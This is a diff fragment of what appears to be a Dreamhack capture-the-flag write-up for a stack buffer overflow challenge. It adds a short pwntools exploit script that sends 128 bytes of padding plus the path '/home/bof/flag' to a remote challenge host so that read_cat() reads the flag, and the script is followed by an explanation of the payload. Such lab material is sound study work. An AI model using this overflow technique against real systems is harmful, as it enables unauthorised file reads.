@@ -21,6 +21,18 @@ The overwritten local_18 is then used as the argument to read_cat(), which attem
 ### 3. Exploitation ###
 #######################
 
+from pwn import *
+
+p = remote('host3.dreamhack.games', 18281)
+read_cat = 0x401236
+
+payload = b'A' * 128
+#payload += b'B' * 8 (for RBP)
+payload += b'/home/bof/flag'
+
+p.sendline(payload)
+p.interactive()
+
 The file we want to read is /home/bof/flag.
 I crafted a payload where:
 I filled the first 128 bytes with junk ('A' * 128).
